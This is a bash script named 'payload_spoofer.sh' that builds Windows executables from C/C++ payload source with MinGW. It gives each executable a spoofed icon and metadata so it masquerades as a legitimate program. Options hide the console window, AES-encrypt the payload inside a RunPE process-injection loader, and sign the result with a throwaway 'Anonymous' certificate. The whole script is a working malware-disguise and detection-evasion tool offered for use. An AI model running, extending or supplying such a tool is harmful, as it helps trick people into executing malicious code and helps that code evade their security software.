#!/bin/bash

BLUE='\033[1;34m'
YELLOW='\033[1;33m'
WHITE='\033[1;37m'
GREEN='\033[1;32m'
RED='\033[1;31m'
NC='\033[0m'
PREFIX="[·]"
script_name=$(basename "$0")

METADATA_DIR="metadata"
ICONS_DIR="icons"
OUTPUT=""
TYPE=""
SOURCE_FILE=""
ARCH="64"
USE_HIDDEN=false
USE_AES=false
SIGN_PAYLOAD=false
EXTRA_FILES=()

show_help() {
  echo -e "---------------------------------------"
  echo -e "${BLUE}${PREFIX} Usage:${NC} ./payload_spoofer.sh <source.c/.cpp> --type <spoof_type> [options]"
  echo -e "${BLUE}${PREFIX} Description:${NC} Compile a Windows payload with spoofed icon and metadata."
  echo -e "${BLUE}${PREFIX} Options:${NC}"
  echo -e "  --type <name>      Required. Spoof type (must match files in icons/ and metadata/)"
  echo -e "  --output <name>    Optional. Output binary name (default: <type>.exe)"
  echo -e "  --hidden           Optional. Hide console window (adds -mwindows)"
  echo -e "  --aes              Optional. Encrypt payload using AES and compile it as a process injector (RunPe injection)"
  echo -e "  --add-file <file>  Optional. Add extra source file to compile"
  echo -e "  --list             Show available spoof types"
  echo -e "  -h, --help         Show this help message"
  echo -e "---------------------------------------"
  exit 0
}

list_spoofers() {
  echo -e "${BLUE}${PREFIX} Available spoofers:${NC}"
  for icon in "$ICONS_DIR"/*.ico; do
    base=$(basename "$icon" .ico)
    if [[ -f "$METADATA_DIR/$base.rc" ]]; then
      echo -e "  - $base"
    fi
  done
  exit 0
}

check_dependencies() {
  MISSING=false
  for pkg in mingw-w64 binutils-mingw-w64 xxd; do
    if ! dpkg -s "$pkg" &>/dev/null; then
      echo -e "${YELLOW}${PREFIX} Installing missing package: ${WHITE}${pkg}${NC}"
      if ! apt-get install -y "$pkg" &>/dev/null; then
        echo -e "${RED}${PREFIX} Failed to install ${pkg}. Please install it manually.${NC}"
        exit 1
      fi
    fi
  done
}
check_dependencies

sign_payload() {
  if ! command -v osslsigncode &>/dev/null; then
    echo -e "${YELLOW}${PREFIX} osslsigncode not found. Installing...${NC}"
    if ! apt-get install -y osslsigncode &>/dev/null; then
      echo -e "${RED}${PREFIX} Failed to install osslsigncode.${NC}"
      exit 1
    fi
  fi

  echo -e "${BLUE}${PREFIX} Generating anonymous certificate...${NC}"
  openssl req -new -newkey rsa:2048 -x509 -days 365 -nodes \
    -subj "/CN=Anonymous/O=Anonymous/C=FR" \
    -keyout anon_key.pem -out anon_cert.pem &>/dev/null

  openssl pkcs12 -export -out anon_cert.pfx -inkey anon_key.pem -in anon_cert.pem -passout pass: &>/dev/null

  SIGNED_OUTPUT="${OUTPUT%.exe}_signed.exe"
  echo -e "${BLUE}${PREFIX} Signing executable...${NC}"
  if osslsigncode sign -pkcs12 anon_cert.pfx -pass "" -n "Anonymous App" -i "https://anonymous.url" \
      -t "http://timestamp.sectigo.com" -in "$OUTPUT" -out "$SIGNED_OUTPUT" &>/dev/null; then
    echo -e "${GREEN}${PREFIX} Signed executable created: ${WHITE}${OUTPUT}${NC}"
    mv "$SIGNED_OUTPUT" "$OUTPUT"
  else
    echo -e "${RED}${PREFIX} Signing failed.${NC}"
    exit 1
  fi

  echo -e "${BLUE}${PREFIX} Cleaning up signing files...${NC}"
  rm -f anon_key.pem anon_cert.pem anon_cert.pfx
}

if [[ ! -d "$ICONS_DIR" || ! -d "$METADATA_DIR" ]]; then
  echo -e "${RED}${PREFIX} Required folders '${ICONS_DIR}' or '${METADATA_DIR}' not found. Exiting.${NC}"
  exit 1
fi

while [[ $# -gt 0 ]]; do
  case "$1" in
    -h|--help|--h)
      show_help
      ;;
    --type)
      TYPE="$2"
      shift 2
      ;;
    --output)
      OUTPUT="$2"
      shift 2
      ;;
    --hidden)
      USE_HIDDEN=true
      shift
      ;;
    --aes)
      USE_AES=true
      shift
      ;;
    --sign)
      SIGN_PAYLOAD=true
      shift
      ;;
    --add-file)
      EXTRA_FILES+=("$2")
      shift 2
      ;;
    --list)
      list_spoofers
      ;;
    *.c|*.cpp)
      SOURCE_FILE="$1"
      shift
      ;;
    *)
      echo -e "${RED}${PREFIX} Unknown option or argument: $1${NC}"
      show_help
      ;;
  esac
done

if [[ -z "$SOURCE_FILE" ]]; then
  echo -e "${RED}${PREFIX} No source file provided.${NC}"
  show_help
fi
if [[ ! -f "$SOURCE_FILE" ]]; then
  echo -e "${RED}${PREFIX} File '$SOURCE_FILE' does not exist.${NC}"
  exit 1
fi

if grep -qi "WOW64\|IsWow64Process\|__i386__" "$SOURCE_FILE"; then
  ARCH="32"
fi

EXT="${SOURCE_FILE##*.}"
IS_CPP=false
if [[ "$EXT" == "cpp" ]]; then
  IS_CPP=true
fi

if [[ -z "$TYPE" ]]; then
  echo -e "${RED}${PREFIX} No spoof type provided.${NC}"
  show_help
fi

ICON_PATH="$ICONS_DIR/${TYPE}.ico"
RC_PATH="$METADATA_DIR/${TYPE}.rc"
RES_PATH="/tmp/${TYPE}_resource.res"

if [[ ! -f "$ICON_PATH" || ! -f "$RC_PATH" ]]; then
  echo -e "${RED}${PREFIX} Spoof type '${TYPE}' not found in icons or metadata.${NC}"
  exit 1
fi

if [[ -z "$OUTPUT" ]]; then
  OUTPUT="${TYPE}.exe"
fi

echo -e "${BLUE}${PREFIX} Compiling resource file...${NC}"
if ! x86_64-w64-mingw32-windres "$RC_PATH" -O coff -o "$RES_PATH"; then
  echo -e "${RED}${PREFIX} Failed to compile resource file.${NC}"
  exit 1
fi

if [[ "$ARCH" == "32" ]]; then
  COMPILER=$([[ "$IS_CPP" == true ]] && echo "i686-w64-mingw32-g++" || echo "i686-w64-mingw32-gcc")
else
  COMPILER=$([[ "$IS_CPP" == true ]] && echo "x86_64-w64-mingw32-g++" || echo "x86_64-w64-mingw32-gcc")
fi

CMD=("$COMPILER" "$SOURCE_FILE" "$RES_PATH")

if $USE_AES; then
  AES_DIR="bin/aes"
  LOADER_C="$AES_DIR/loaders/${TYPE}_loader.c"
  if [[ ! -f "$LOADER_C" ]]; then
    echo -e "${RED}${PREFIX} AES loader '$LOADER_C' not found.${NC}"
    exit 1
  fi
  AES_C="$AES_DIR/aes.c"
  AES_H="$AES_DIR/aes.h"
  ENC_BIN="payload.enc"

  if [[ ! -f "$AES_C" || ! -f "$AES_H" || ! -f "$AES_DIR/aes_encryption.py" ]]; then
    echo -e "${RED}${PREFIX} AES files are missing in $AES_DIR.${NC}"
    exit 1
  fi

  echo -e "${BLUE}${PREFIX} Compiling raw payload before encryption...${NC}"
  RAW_PAYLOAD="/tmp/raw_payload.exe"

  RAW_LINK=""
  if grep -qi "WSA\|winsock" "$SOURCE_FILE"; then
    RAW_LINK="-lws2_32"
  fi

  x86_64-w64-mingw32-gcc "$SOURCE_FILE" -o "$RAW_PAYLOAD" $RAW_LINK || {
    echo -e "${RED}${PREFIX} Failed to compile raw payload.${NC}"
    exit 1
  }

  echo -e "${BLUE}${PREFIX} Encrypting payload with AES...${NC}"
  python3 "$AES_DIR/aes_encryption.py" "$RAW_PAYLOAD" "$ENC_BIN" || {
    echo -e "${RED}${PREFIX} AES encryption failed.${NC}"
    exit 1
  }
  echo -e "${BLUE}${PREFIX} Embedding encrypted payload into C header...${NC}"
  xxd -i "$ENC_BIN" > "$AES_DIR/payload_data.h"

  SOURCE_FILE="$LOADER_C"
  CMD=("$COMPILER" "$SOURCE_FILE" "$AES_C" "$RES_PATH" -I. -Ibin/aes)
  [[ "$(realpath "$ENC_BIN")" != "$(realpath ./payload.enc)" ]] && cp "$ENC_BIN" .
fi

for file in "${EXTRA_FILES[@]}"; do
  if [[ -f "$file" ]]; then
    CMD+=("$file")
  else
    echo -e "${RED}${PREFIX} Extra file '$file' does not exist. Skipping.${NC}"
  fi
done

if $USE_HIDDEN; then
  CMD+=("-mwindows")
fi

if grep -qi "WSA\|winsock" "$SOURCE_FILE"; then
  CMD+=("-lws2_32")
fi

CMD+=("-o" "$OUTPUT")

echo -e "${BLUE}${PREFIX} Compiling payload as ${ARCH}-bit ${IS_CPP:+C++} binary...${NC}"
if "${CMD[@]}"; then
  echo -e "${GREEN}${PREFIX} Compilation successful: ${WHITE}${OUTPUT}${NC}"
  if $SIGN_PAYLOAD; then
    sign_payload
  fi
  if $USE_AES; then
    echo -e "${BLUE}${PREFIX} Cleaning temporary AES files...${NC}"
    rm -f payload.enc key_iv.h /tmp/raw_payload.exe
  fi
else
  echo -e "${RED}${PREFIX} Compilation failed.${NC}"
  exit 1
fi
